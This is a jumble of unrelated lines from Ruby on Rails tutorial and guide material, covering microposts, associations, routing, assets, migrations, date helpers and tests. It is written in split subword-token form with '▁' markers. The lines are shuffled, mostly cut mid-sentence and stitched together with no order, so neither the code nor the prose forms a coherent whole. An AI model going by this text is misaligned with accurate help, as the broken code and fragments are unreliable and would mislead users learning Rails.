▁A ▁model ▁for ▁user ▁followers ▁through ▁ passive ▁relationships .
▁belongs _ to ▁Association ▁D iagram ]( images / belongs _ to ▖ png )
▁S a y ▁for ▁example ▁we ▁are ▁at ▁the ▁end ▁of ▁Feb ru ary ▁of ▁2010 , ▁and ▁we ▁want ▁to ▁move ▁one ▁ month ▁and ▁one ▁day ▁forward .
▁ description : ▁email ▖ subject
▁A mong ▁other ▁features , ▁the ▁cloud ▁IDE ▁text ▁editor ▁supports ▁the ▁`` Fi nd ▁in ▁File s '' ▁ global ▁search ▁that ▁I ▁consider ▁essential ▁to ▁ nav ig ating ▁any ▁large ▁Ruby ▁or ▁Rails ▁project
▁#### ▁image _ tag
▁This ▁m ight ▁involve ▁adding ▁an ▁\ k ode { in \_ reply \_ to } ▁column ▁in ▁the ▁\ k ode { microposts } ▁table ▁and ▁an ▁extra ▁\ k ode { including \_ replies } ▁scope ▁to ▁the ▁Micropost ▁model .
▁== ▁Create Microposts : ▁migrat ed ▁(0▖00 2 6 s ) ▁============= ========= ================
▁# ▁=> ▁#< Client ▁id : ▁10 , ▁first _ name : ▁" Ryan ">
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁a ▁ human - read able ▁number ▁of ▁by te s :
▁And , ▁as ▁you ▁m ight ▁suspect ▁by ▁now , ▁there ▁are ▁ RailsCasts ▁on ▁many ▁ s caling ▁subject s , ▁including ▁pro fi l ing , ▁ caching , ▁and ▁background ▁job s .
▁You ▁can ▁read ▁more ▁about ▁these ▁in ▁the ▁[ Asset ▁Pipeline ]( asset _ pipeline ▖ html ) ▁guide .
▁instead ▁by ▁passing ▁in ▁the ▁appropriate ▁parameter ▁to ▁\ k ode { authenticated ?} .
▁### ▁Access
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title ▖
▁< li > <%= ▁ msg ▁%></ li >
▁install s ▁the ▁latest ▁version ▁of ▁the ▁\ k ode { uglifier } ▁gem ▁( which ▁handle s ▁file ▁compression ▁for ▁the ▁asset ▁pipeline ) ▁as ▁long ▁as ▁it ' s ▁ greater ▁than ▁or ▁equal ▁to ▁version ~\ k ode { 1 ▖ 3▖0 } --- even ▁if ▁it ' s , ▁say , ▁version ~\ k ode { 7▖2 } .
▁* ▁You ▁may ▁be ▁doing ▁f r equ ent ▁deploy s ▁that ▁do ▁not ▁include ▁asset ▁changes .
▁ Lock ing ▁is ▁helpful ▁for ▁ preventing ▁ ra ce ▁conditions ▁when ▁updating ▁records ▁in ▁the ▁database ▁and ▁ en s ur ing ▁ atomic ▁update s .
▁validates ▁: title , ▁length : ▁ { ▁is : ▁5 ▁ }, ▁allow _ blank : ▁true
▁To ▁test ▁micropost ▁pagination , ▁we ' ll ▁also ▁generate ▁some ▁ additional ▁micropost ▁fixtures ▁using ▁the ▁same ▁ embedded ▁Ruby ▁technique ▁we ▁used ▁to ▁make ▁ additional ▁users ▁in ▁Listing ~\ ref { code : users _ fixtures _ extra _ users } :
▁Ou r ▁goal ▁now ▁is ▁to ▁write ▁tests ▁for ▁the ▁right ▁behavior ▁given ▁invalid ▁and ▁valid ▁signup ▁information .
▁* ▁No ▁ tr ailing ▁whitespace ▖
▁En s ur ing ▁that ▁a ▁User ▁object ▁has ▁a ▁\ k ode { password \_ digest } ▁column .
▁| ▁| ▁4 28 ▁| ▁: pre condition _ require d ▁|
▁For ▁example , ▁here ' s ▁some ▁code ▁that ▁will ▁trigger ▁this ▁error :
▁As ▁with ▁the ▁for th com ing ▁sample ▁application , ▁the ▁ demo ▁app ▁will ▁consist ▁of ▁\ emph { users } ▁and ▁their ▁ associated ▁\ emph { microposts } ▁( th us ▁ const it u ting ▁a ▁minimal ist ▁Twitter - style ▁app ) .
▁$ ▁git ▁remote ▁add ▁ JohnSmith ▁git :// github ▖ com / JohnSmith / rails ▖ git
▁As ▁a ▁result ,
▁The ▁P urpose ▁of ▁the ▁Rails ▁Route r
▁In ▁this ▁chapter , ▁we ' ve ▁ha m m er ed ▁our ▁application ▁layout ▁into ▁ s ha pe ▁and ▁polish ed ▁up ▁the ▁routes .
▁match ▁' photos ', ▁to : ▁' photos # show ', ▁via : ▁ [: get , ▁: post ]
▁m ▁= ▁Object ▖ send (: remove _ const , ▁: M )
▁@ comment ▁= ▁@ article ▖ comments ▖ create ( comment _ params )
▁update ▁user
▁The ▁appearance ▁of ▁a ▁link ▁to ▁the ▁profile ▁page
▁With ▁unique ▁remember ▁token s , ▁an ▁attacker ▁always ▁needs ▁\ emph { bo th } ▁the ▁user ▁id ▁and ▁the ▁remember ▁token ▁cookies ▁to ▁ hijack ▁the ▁session .
▁In ▁all ▁three ▁cases , ▁ ob serv e ▁that ▁each ▁micropost ▁display ▁indicates ▁the ▁time ▁since ▁it ▁was ▁created ▁( e ▖ g ▖ , ▁`` P o s ted ▁1 ▁ minute ▁ ago ▖ '') ; ▁this ▁is ▁the ▁work ▁of ▁the ▁\ k ode { time \_ ago \_ in \_ words } ▁method ▁from ▁Listing ~\ ref { code : micropost _ partial } .
▁ ╼ ▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁### ▁Configur ing ▁a ▁Database
▁# ▁=> ▁ Token Generation E xception : ▁ Token ▁can ' t ▁be ▁blank
▁The ▁cache ▁is ▁even ▁ shared ▁a cross ▁methods ▖
▁token , ▁options ▁= ▁token _ and _ options ( controller ▖ request )
▁# ▁Now ▁your ▁job ▁will ▁run ▁on ▁ queue ▁production _ low _ priority ▁on ▁your
▁Here ▁we ▁are ▁using ▁the ▁\ k ode { upcase } ▁method ▁on ▁strings ▁( se en ▁brief ly ▁in ▁Section ~\ ref { sec : block s }) .
▁ Migration s
▁We ' ve ▁covered ▁the ▁" C R " ▁part ▁of ▁ CRUD ▖
▁Tests ▁for ▁an ▁\ k ode { admin } ▁attribute .
▁For ▁example , ▁if ▁you ▁take ▁a ▁look ▁back ▁at ▁Figure ~\ ref { fig : edit or _ s hell }, ▁you ' ll ▁see ▁a ▁small ▁vertical ▁line ▁on ▁the ▁right ▁to ▁help ▁keep ▁code ▁under ▁ 80 ▁characters .
▁( You ▁can ▁also ▁verify ▁by ▁remov ing ▁the ▁\ k ode { authenticated ?}\ ▁expression ▁in ▁Listing ~\ ref { code : branch _ no _ raise } ▁that ▁the ▁second ▁test ▁in ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁fails , ▁which ▁confirm s ▁that ▁it ▁tests ▁the ▁right ▁thing ▖)
▁# ▁No ▁ surname ▁instance ▁reader ▁or ▁ surname = ▁ writer ▁is ▁generated .
▁class ▁P la y er ▁< ▁ActiveRecord :: Base
▁Because ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁are ▁both ▁instance ▁variables ▁( as ▁indicate d ▁with ▁the ~\ k ode {@ } ▁sign ), ▁they ▁are ▁automatically ▁available ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁# ▁This ▁is ▁pre li m in ary .
▁" B e t el ge use !"
▁For ▁example , ▁the ▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { source ▁code } ▁of ▁\ k ode { has \_ secure \_ password } ▁make s ▁this ▁mistake , ▁as ▁did ▁the ▁first ▁two ▁ edition s ▁of ▁this ▁tutorial .
▁As ▁with ▁any ▁refactoring , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing \ ▁after ▁changing ▁the ▁application ▁code :
▁C ▖ x ▁= ▁: c
▁* ▁` config ▖ action _ controller ▖ asset _ host ` ▁set s ▁the ▁host ▁for ▁the ▁assets ▖
▁For ▁brevity , ▁when ▁refer r ing ▁to ▁the ▁file
▁As ▁you ▁ probably ▁suspect , ▁we ▁will ▁not ▁be ▁making ▁a ▁whole ▁database ▁table ▁just ▁to ▁hold ▁ reverse ▁relationships .
▁As signing ▁an ▁object ▁to ▁a ▁` belongs _ to ` ▁association ▁does ▁ _ not _ ▁automatically ▁save ▁the ▁object ▖
▁# ▁is ▁enabled ▁by ▁default .
▁A ▁test ▁for ▁ friendly ▁ forwarding ▖
▁We ▁can ▁render ▁the ▁ footer ▁partial ▁in ▁the ▁layout ▁by ▁following ▁the ▁same ▁pattern ▁as ▁the ▁stylesheets ▁and ▁header ▁partials ▁( Listing ~\ ref { code : layout _ with _ footer }) .
▁The ▁` has _ one ` ▁relationship ▁say s ▁that ▁one ▁of ▁something ▁is ▁your s ▁- ▁that ▁is , ▁that ▁something ▁point s ▁back ▁to ▁you ▖
▁#### ▁` append `
▁ Adding ▁a ▁test ▁for ▁the ▁signup ▁page ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : layout _ exercises } ▖)
▁You ' ll ▁learn ▁a ▁little ▁about ▁associations ▁in ▁the ▁next ▁section ▁of ▁this ▁guide .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource } .
▁create ▁app / helpers / users _ helper ▖ rb
▁Logging ▁out ▁from ▁a ▁ persistent ▁session .
▁if ▁@ supplier ▖ account ▖ nil ?
▁For ▁brevity , ▁throughout ▁the ▁rest ▁of ▁this ▁tutorial ▁I ' ll ▁use ▁\ k ode { subl } ▁as ▁a ▁shorthand ▁for ▁`` open ▁with ▁your ▁favor ite ▁text ▁editor ▖ ''
▁" Admin :: Session "▖ foreign _ key ▁# ▁=> ▁" session _ id "
▁The ▁ max ▁ po ol ▁size ▁is ▁current ly ▁5 ; ▁consider ▁increasing ▁it :
▁The ▁password ▁reset ▁HTML ▁email ▁template .
▁With in ▁the ▁block ▁of ▁ member ▁routes , ▁each ▁route ▁name ▁specifie s ▁the ▁HTTP ▁verb ╼ will ▁be ▁recognize d ▖
▁To ▁get ▁the ▁production ▁site ▁working , ▁we ▁have ▁to ▁commit ▁the ▁change ▁to ▁the ▁configuration ▁file ▁and ▁push ▁the ▁result ▁up ▁to ▁Heroku :
▁* ▁` before _ enqueue `
▁On ce ▁the ▁image ▁has ▁been ▁upload ed , ▁we ▁can ▁render ▁it ▁using ▁the ▁\ k ode { image \_ tag } ▁helper ▁in ▁the ▁micropost ▁partial , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ partial _ image _ display } .
▁To ▁quickly ▁generate ▁this , ▁you ▁can ▁use ▁the ▁Rails ▁scaffold ▁generator .
▁Here ▁is ▁an ▁example :
▁The ▁` collection _ singular _ id s ` ▁method ▁returns ▁an ▁array ▁of ▁the ▁id s ▁of ▁the ▁objects ▁in ▁the ▁collection .
▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ session } .
▁Then ▁we ' ll ▁add ▁a ▁very ▁small ▁amount ▁of ▁dynamic ▁content ▁by ▁changing ▁the ▁title ▁on ▁a ▁per - page ▁basis .
▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax } .
▁For ▁example , ▁given ▁the ▁declaration :
▁Object ▖ qualified _ const _ get (" Math :: P I ") ▁# ▁=> ▁3▖1 4 15 92 6 53 58 9 7 9 3
▁Client ▖ joins (' LE F T ▁ OUT ER ▁JOIN ▁addresses ▁ ON ▁addresses ▖ client _ id ▁= ▁clients ▖ id ')
▁Rails ▁infer s ▁the ▁names ▁of ▁the ▁foreign ▁keys ▁from ▁the ▁corresponding ▁symbols ▁( i ▖ e ▖ , ▁\ k ode { follower \_ id } ▁from ▁\ k ode { : follower }, ▁and ▁\ k ode { followed \_ id } ▁from ▁\ k ode { : followed }), ▁but ▁since ▁there ▁is ▁ n either ▁a ▁ Follow ed ▁no r ▁a ▁ Follow er ▁model ▁we ▁need ▁to ▁supply ▁the ▁class ▁name ▁\ k ode { User } .
▁The ▁solution ▁involve s ▁our ▁first ▁example ▁of ▁\ emph { meta programming }, ▁which ▁is ▁ essentially ▁a ▁program ▁that ▁write s ▁a ▁program .
▁* ▁A ▁namespaced ▁` Application Helper ` ▁ stub
▁For ▁the ▁" blorgh " ▁example , ▁you ▁will ▁need ▁to ╼ create ▁a ▁" mountable " ▁engine , ▁running ▁this ▁command ▁in ▁a ▁terminal :
▁When ▁using ▁the ▁`: json ` ▁or ▁`: hybrid ` ▁serializ er , ▁you ▁should ▁be w a re ▁that ▁not ▁all ╼ Ruby ▁objects ▁can ▁be ▁serializ ed ▁as ▁JSON ▖ ▁For ▁example , ▁` Date ` ▁and ▁` Time ` ▁objects ╼ will ▁be ▁serializ ed ▁as ▁strings , ▁and ▁` Hash ` es ▁will ▁have ▁their ▁keys ▁ stringified .
▁name : ▁[ ' John ', ▁' S er ge i ' ])
▁The ▁purpose ▁is ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁Ruby ▁on ▁Rails ▁programming ▁( and ▁web ▁development ▁in ▁general ) ▁by ▁ rap id ly ▁ generating ▁an ▁application ▁using ▁\ emph { scaffold ▁generator s }, ▁which ▁create ▁a ▁large ▁amount ▁of ▁functionality ▁automatically .
▁# ▁Or ig in al ▁query ▁without ▁` unscope `
▁C ▖ x ▁# ▁=> ▁: b
▁# ▁=> ▁< input ▁id =" pass " ▁name =" pass " ▁type =" password " ▁/>
▁to ▁express ▁the ▁expect ation ▁of ▁see ing ▁an ▁error ▁message , ▁and
▁" foo "▖ indent ( 2, ▁" \ t ") ▁# ▁=> ▁" \ t \ t foo "
▁user ▖ destroy
▁in ▁Listing ~\ ref { code : add _ remember _ token _ to _ users } .
▁bin stub s
▁In spec ting ▁the ▁state ▁of ▁the ▁system ▁using ▁\ text tt { by ebug } ▁is ▁a ▁powerful ▁method ▁for ▁ track ing ▁down ▁application ▁errors ▁and ▁inter active ly ▁debugging ▁your ▁application .
▁included ▁do
▁E mail ▁settings ▁in ▁development .
▁The ▁result ▁of ▁the ▁CSS ▁in ▁Listing ~\ ref { code : universal _ css } ▁is ▁show n ▁in ▁Figure ~\ ref { fig : sample _ app _ universal } .
▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } : ▁A ▁large ▁variety ▁of ▁inter active ▁programming ▁course s
▁# ▁=> ▁[ [ 0 ] , ▁[ - 5 ] , ▁[] , ▁[" foo ", ▁" bar " ]]
▁in ▁Listing ~\ ref { code : rspec _ u til it ies _ simplified } .
▁ nick ▖ new _ record ?
▁### ▁Configur ing ▁ Middleware ▁ Stack
▁Before ▁mov ing ▁on , ▁if ▁you ' re ▁using ▁Git ▁it ' s ▁a ▁good ▁idea ▁to ▁add ▁the ▁files ▁for ▁the ▁Static ▁Pages ▁controller ▁to ▁the ▁remote ▁repository :
▁=> ▁false
▁The ▁test ▁suite ▁should ▁be ▁\ passing :
▁### ▁P re compiling ▁ Asset s
▁This ▁link ▁is ▁then ▁processed ▁by ▁the ▁Sprockets ▁gem ▖
▁S up po se ▁you ▁want ▁to ▁find ▁a ▁client ▁named ▁' Andy ', ▁and ▁if ▁there ' s ▁ none , ▁create ▁one ▖
▁class ▁ Blacklist Constraint
▁The ▁method ▁` humanize ` ▁t we a k s ▁an ▁attribute ▁name ▁for ▁display ▁to ▁end ▁users .
▁### ▁Association ▁Extensions
▁pull s ▁\ emph { all } ▁the ▁followed ▁users ' ▁id s ▁into ▁memory , ▁and ▁creates ▁an ▁array ▁the ▁full ▁length ▁of ▁the ▁followed ▁users ▁array .
▁This ▁is ▁because ▁\ k ode { rails ▁new } ▁generates ▁single - quot ed ▁strings , ▁whereas ▁the ▁\ href { https :// github ▖ com / k er n / minitest - reporters } { M in i Test ▁ reporters ▁documentation } ▁uses ▁double - quot ed ▁strings .
▁which ▁( as ▁describe d ▁in ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖0▖0 / classes / ActiveModel / Validations / Helper Methods ▖ html # method - i - validates _ confirmation _ of } { Rails ▁API }) ▁ automagically ▁creates ▁an ▁attribute ▁called ▁\ k ode { password \_ confirmation } .
▁A ma z ing ly , ▁Ruby ▁let s ▁you ▁do ▁just ▁this ; ▁Ruby ▁classes ▁can ▁be ▁\ emph { open ed } ▁and ▁ modified , ▁allow ing ▁ordinar y ▁m or t al s ▁such ▁as ▁our s el ve s ▁to ▁add ▁methods ▁to ▁them
▁A ▁ preview ▁of ▁text ▁version ▁the ▁account ▁activation ▁email .
▁For ▁example , ▁consider ▁a ▁hash ▁named ▁\ k ode { flash } ▁with ▁keys ▁for ▁two ▁conditions , ▁\ k ode { : success } ▁and ▁\ k ode { : danger } :
▁ Getting ▁the ▁initial ▁password ▁tests ▁to ▁pass .
▁### ▁form _ tag
▁30 ▖ ▖ 50 ) ▁# ▁=> ▁false
▁ Mo c k up s ▁matching ▁these ▁requirements ▁appear ▁in ▁Figure ~\ ref { fig : following _ mockup } ▁( following ) ▁and ▁Figure ~\ ref { fig : followers _ mockup } ▁( followers ) .
▁The ▁following ▁methods ▁are ▁only ▁implemented ▁in ▁` active _ support / core _ ext / date _ time / calculations ▖ rb ` ▁as ▁they ▁only ▁make ▁sense ▁when ▁used ▁with ▁a ▁` DateTime ` ▁instance :
▁Note ▁that ▁the ▁\ k ode { s r c } ▁attribute ▁\ emph { does n ' t } ▁include ▁\ k ode { images }, ▁instead ▁using ▁an ▁\ k ode { assets } ▁directory ▁common ▁to ▁all ▁assets ▁( images , ▁JavaScript , ▁CSS , ▁etc ▖) .
▁email = michael %40 michael hartl ▖ com ╼ - --- == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a ╼ Content - Type : ▁text / html ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ < h 1> Sample ▁App </ h 1 >╼╼< p > H i ▁ Michael ▁Hartl , </ p >╼╼< p >╼ Welcome ▁to ▁the ▁ Sample ▁App !
▁can ▁be ▁test ed ▁using ▁the ▁RSpec ▁code
▁The ▁default ▁is ▁true .
▁For ▁example , ▁you ╼ m ight ▁concatenate ▁three ▁CSS ▁files ▁together ▁this ▁way :
▁This ▁behavior ▁make s ▁debugging ▁easier ▁by ▁avoid ing ▁ s ile nt ▁errors .
▁ ╼ ▁end
▁@ article ▁= ▁Article ▖ find ( params [: id ])
▁=> ▁" development "
▁The ▁cap it a li z ation ▁of ▁the ▁first ▁word ▁can ▁be ▁turn ed ▁off ▁by ▁setting ▁the ╼ + : capitalize + ▁option ▁to ▁false ▁( default ▁is ▁true ) .
▁t ▖ boolean ▁: s ing le _ issue
▁After ▁the ▁cookies ▁are ▁set , ▁on ▁subsequent ▁page ▁views ▁we ▁can ▁retrieve ▁the ▁user ▁with ▁code ▁like
▁The ▁optional ▁four th ▁line ▁is ▁included ▁so ▁that ▁you ▁can ▁use ▁\ k ode { co } ▁in ▁place ▁of ▁the ▁more ▁verb o se ▁\ k ode { checkout } ▁command .
▁The ▁default ▁tests ▁for ▁the ▁StaticPages ▁controller ▖
▁Additional ly , ▁options ▁passed ▁to ▁this ▁can ▁be ▁configured ▁by ▁using ▁` config ▖ action _ controller ▖ session _ options ` .
▁I ma g in e ▁a ▁blacklist ▁delete s ▁" script " ▁from ▁the ▁user ▁input ▖
▁Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In
▁=> ▁[ 42, ▁ 8, ▁17 , ▁6 , ▁7 ]
▁On ce ▁you ' ve ▁placed ▁your ▁assets ▁in ▁their ▁ logical ▁location s , ▁you ▁can ▁use ▁\ emph { manifest ▁files } ▁to ▁tell ▁Rails ▁( via ▁the ▁\ href { https :// github ▖ com / rails / sprockets } { Sprockets } ▁gem ) ▁how ▁to ▁combine ▁them ▁to ▁form ▁single ▁files .
▁In ▁Ruby ▁1▖9 ▁` prev _ month ` ▁and ▁` next _ month ` ▁return ▁the ▁date ▁with ▁the ▁same ▁day ▁in ▁the ▁last ▁or ▁next ▁ month :
▁ ╼ ▁> > ▁@ user
▁En s ur ing ▁that ▁a ▁user ' s ▁microposts ▁are ▁destroyed ▁along ▁with ▁the ▁user .
▁( Note ▁that , ▁in ▁contrast ▁to ▁the ▁plural ▁convention ▁for ▁controller ▁names , ▁model ▁names ▁are ▁ singular : ▁a ▁\ emph { Users } ▁controller , ▁but ▁a ▁\ emph { User } ▁model ▖)
▁</ tr >
▁# ▁The ▁module ▁object ▁is ▁orphan ▁now ▁but ▁it ▁ still ▁has ▁a ▁name .
▁Recall ing ▁the ▁\ emph { or } ~ o p er at or ▁\ text tt {||} ▁seen ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing }, ▁we ▁can ▁write ▁this ▁as ▁follows :
▁No ▁security
▁3 ▖ ▖ 7 ) ▁# ▁=> ▁true
▁Rails ▁automatically ▁convert s ▁this ▁to ▁the ▁route ▁for ▁the ▁user ' s ▁profile ▁page :
▁The ▁micropost ▁index ▁page ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ micropost _ index _ rails _ 3- full ▖ png }{( full ▁size )}
▁* ▁` action _ mailer ▖ set _ config s ` ▁Set s ▁up ▁Action ▁Mailer ▁by ▁using ▁the ▁settings ▁in ▁` config ▖ action _ mailer ` ▁by ▁` send ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActionMailer :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁There ▁are ▁many ▁ways ▁to ▁test ▁for ▁the ▁result ▁of ▁an ▁ expiration , ▁but ▁the ▁method ▁suggest ed ▁by ▁Listing ~\ ref { code : password _ reset _ expire _ test } ▁is ▁to ▁( case - insensitive ly ) ▁check ▁that ▁the ▁response ▁ body ▁includes ▁the ▁word ▁`` expired '' .
▁* ▁` control s : ▁true `, ▁provides ▁browser ▁supplied ▁control s ▁for ▁the ▁user ▁to ▁interact ▁with ▁the ▁ audio .
▁Instead ▁of :
▁* ▁: through
▁Verify ▁by ▁running ▁the ▁test ▁suite ▁that ▁the ▁ cleaner ▁code ▁in ▁Listing ~\ ref { code : layout _ flash _ content _ tag }, ▁which ▁uses ▁the ▁Rails ▁\ k ode { content \_ tag } ▁helper , ▁also ▁works .
▁Rails ▁also ▁supports ▁ MySQL ▁and ▁PostgreSQL ▁" out ▁of ▁the ▁ box ", ▁and ▁has ▁plugin s ▁for ▁many ▁database ▁systems ▖
▁3 ▖ ▖ 11 ) ▁# ▁=> ▁false
▁These ▁are ▁useful ▁for ▁upload ▁validations , ▁making ▁it ▁easy ▁to ▁restrict , ▁say , ▁image ▁upload s ▁to ▁\ text tt { 5 ▖ me g abytes } .
▁If ▁you ▁would ▁like ▁to ▁only ▁gra b ▁a ▁single ▁record ▁per ▁unique ▁value ▁in ▁a ▁certain ▁field , ▁you ▁can ▁use ▁` distinct `:
▁When ▁construct ing ▁a ▁form ▁using ▁\ k ode { form \_ for (@ user ) }, ▁Rails ▁uses ▁\ text tt { POST } ▁if ▁\ k ode {@ user ▖ new \_ record ?}\ ▁is ▁\ k ode { true } ▁and ▁\ text tt { PATCH } ▁if ▁it ▁is ▁\ k ode { false } .
▁In ▁each ▁case , ▁the ▁pattern ▁is ▁that ▁\ text tt { x ▁= ▁x ▁O ▁ y } ▁and ▁\ text tt { x ▁O = ▁ y } ▁are ▁equivalent ▁for ▁any ▁operator ▁\ text tt { O } .
▁Next , ▁the ▁` test _ unit ` ▁generator ▁is ▁invoke d ▁for ▁this ▁model , ▁ generating ▁a ▁model ╼ test ▁at ▁` test / models / blorgh / article _ test ▖ rb ` ▁( ra the r ▁than ╼` test / models / article _ test ▖ rb ` ) ▁and ▁a ▁fixture ▁at ▁` test / fixtures / blorgh / articles ▖ yml `╼ ( ra the r ▁than ▁` test / fixtures / articles ▖ yml ` ) .
▁Rails ▁allows ▁you ▁to ▁customize ▁virtual ly ▁any ▁generic ▁part ▁of ▁the ▁resource ful ▁helpers .
▁### ▁ Adding ▁E le ment s
▁You ▁can ▁learn ▁more ▁about ▁migrations ▁in ▁the ╼[ Active ▁Record ▁ Migration s ▁guide ]( migrations ▖ html ) .
▁( A n ▁error ▁will ▁appear ▁in ▁the ▁Rails ▁log , ▁but ▁that ▁doesn ' t ▁do ▁any ▁ha rm .
▁The ▁following ▁section s ▁give ▁the ▁details ▁of ▁each ▁type ▁of ▁association , ▁including ▁the ▁methods ▁that ▁they ▁add ▁and ▁the ▁options ▁that ▁you ▁can ▁use ▁when ▁declar ing ▁an ▁association .
▁* ▁` config ▖ asset _ host ` ▁set s ▁the ▁host ▁for ▁the ▁assets ▖
▁Next , ▁we ▁need ▁a ▁test ▁to ▁capture ▁the ▁ sequence ▁show n ▁in ▁Figure ~\ ref { fig : failed _ login _ flash _ 3 r d _ edition } ▁and ▁Figure ~\ ref { fig : flash _ persistence _ 3 r d _ edition } .
▁It ' s ▁easier ▁to ▁describe ▁what ▁objects ▁\ emph { do }, ▁which ▁is ▁respond ▁to ▁messages .
▁d ▖ beginning _ of _ month ▁# ▁=> ▁S at , ▁01 ▁May ▁2010
▁create ▁app / views / static _ pages
▁* ▁` ActionDispatch :: SSL ` ▁ force s ▁every ▁request ▁to ▁be ▁under ▁HTTP S ▁protocol ▖
▁Let ▁us ▁also ▁move ▁that ▁new ▁comment ▁section ▁out ▁to ▁its ▁own ▁partial ▖
▁NOTE : ▁ Only ▁the ▁directory ▁notation ▁is ▁supported ▖
▁To ▁use ▁this ▁method , ▁add ▁this ▁code ▁into ╼` app / views / articles / new ▖ html ▖ erb `:
▁< div >
▁* ▁` config ▖ action _ controller ▖ relative _ url _ root ` ▁can ▁be ▁used ▁to ▁tell ▁Rails ▁that ▁you ▁are ▁[ deploying ▁to ▁a ▁sub directory ]( configuring ▖ html # deploy - to - a - s ub directory - relative - url - root )▖
▁You ▁should ▁verify ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁is ▁red :
▁\ href { http :// michael hartl ▖ com /}{ Michael ▁Hartl } ▁is ▁the ▁author ▁of ▁the ▁\ href { http :// ruby ▖ railstutorial ▖ org /}{ \ emph { Ruby ▁on ▁Rails ▁Tutorial } }, ▁the ▁leading ▁introduction ▁to ▁web ▁development ▁with ▁\ href { http :// rubyonrails ▖ org /}{ Ruby ▁on ▁Rails } .
▁mail ▖ delivery _ method ▖ settings ▖ merge !(
▁Defaults ▁to ▁` nil `, ▁which ▁means ▁` active _ support / all ` ▁is ▁loaded .
▁C an ▁you ▁think ▁of ▁a ▁nice r ▁or ▁faster ▁way ▁to ▁implement ▁a ▁part ▁of ▁their ▁change ?
▁In ▁order ▁to ▁validate ▁ associated ▁records ▁who se ▁absence ▁is ▁required , ▁you ▁must ╼ specify ▁the ▁`: inverse _ of ` ▁option ▁for ▁the ▁association :
▁4 3 , ▁ 44 , ▁ 45 , ▁4 6 , ▁4 7 , ▁ 48 , ▁4 9 , ▁50 , ▁ 51 "
▁* ▁`: nullify ` ▁cause s ▁the ▁foreign ▁keys ▁to ▁be ▁set ▁to ▁` NULL ` ▖
▁< h 3 > Comments </ h 3 >
▁` camelize ` ▁is ▁alias ed ▁to ▁` c a me l case ` .
▁The ▁console ▁is ▁a ▁great ▁learning ▁tool , ▁and ▁you ▁should ▁feel ▁free ▁to ▁explor e --- d on ' t ▁worry , ▁you ▁( probably ) ▁won ' t ▁break ▁anything .
▁ ╼ ▁end
▁* ▁` config ▖ action _ mailer ▖ raise _ delivery _ errors ` ▁specifie s ▁whether ▁to ▁raise ▁an ▁error ▁if ▁email ▁ delivery ▁cannot ▁be ▁complete d ▖
▁The ▁\ k ode { bundle } ▁command ▁by ▁itself ▁is ▁an ▁alias ▁for ▁\ k ode { bundle ▁install } .
▁The ▁generated ▁account ▁activation ▁HTML ▁view .
▁These ▁posts ▁only ▁appear ▁in ▁the ▁feed ▁of ▁the ▁user ▁in ▁question ▁or ▁users ▁following ▁that ▁user .
▁In ▁fact , ▁this ▁set ▁can ▁be ▁any ▁ enumerable ▁object .
▁- b ▁updating - users ╼\ end { code }╼╼ ▁\ subsection { Edit ▁form } ▁% ▁( fold )╼ ▁\ label { sec : edit _ form }╼╼ We ▁start ▁with ▁the ▁edit ▁form , ▁who se ▁mockup ▁appears ▁in ▁Figure ~\ ref { fig : edit _ user _ mockup } ▖ \ foot note { Image ▁retrieved
▁For ▁big g er ▁site s , ▁you ▁would ▁ probably ▁need ▁to ▁generate ▁the ▁feed ▁a synchronous ly ▁using ▁a ▁background ▁job , ▁but ▁such ▁ s caling ▁ subtle t ies ▁are ▁ beyond ▁the ▁scope ▁of ▁this ▁tutorial .
▁<% ▁if ▁@ customer ▖ orders ▖ empty ?
▁When ▁creating ▁a ▁column ▁in ▁a ▁database , ▁it ▁is ▁important ▁to ▁consider ▁whether ▁we ▁will ▁need ▁to ▁\ emph { find } ▁records ▁by ▁that ▁column .
▁The ▁rules ▁in ▁Listing ~\ ref { code : guard file } ▁are ▁optimized ▁for ▁this ▁tutorial , ▁automatically ▁running ▁( for ▁example ) ▁the ▁integration ▁tests ▁when ▁a ▁controller ▁is ▁changed .
▁* ▁X - XSS - Pro t ec tion
▁This ▁order ▁is ▁relevant , ▁a ▁different ▁ ordering ▁would ▁give ▁different ▁ datetime s ▁in ▁some ▁ ed ge - case s ▖
▁These ▁helpers ▁provide ▁common ▁validation ╼ ru le s ▖
▁* ▁` config ▖ i 18 n ▖ load _ path ` ▁set s ▁the ▁path ▁Rails ▁uses ▁to ▁look ▁for ▁ locale ▁files ▖
▁This ▁helper ▁validates ▁that ▁the ▁attributes ' ▁values ▁are ▁not ▁included ▁in ▁a ▁given ╼ set ▖
▁A ▁test ▁for ▁a ▁valid ▁signup ▖
▁def ▁ welcome _ email ( user )
▁Create s ▁a ▁ radio ▁button ; ▁use ▁ groups ▁of ▁ radio ▁button s ▁named ▁the ▁same ▁to ▁allow ▁users ▁to ▁select ▁from ▁a ▁group ▁of ▁options .
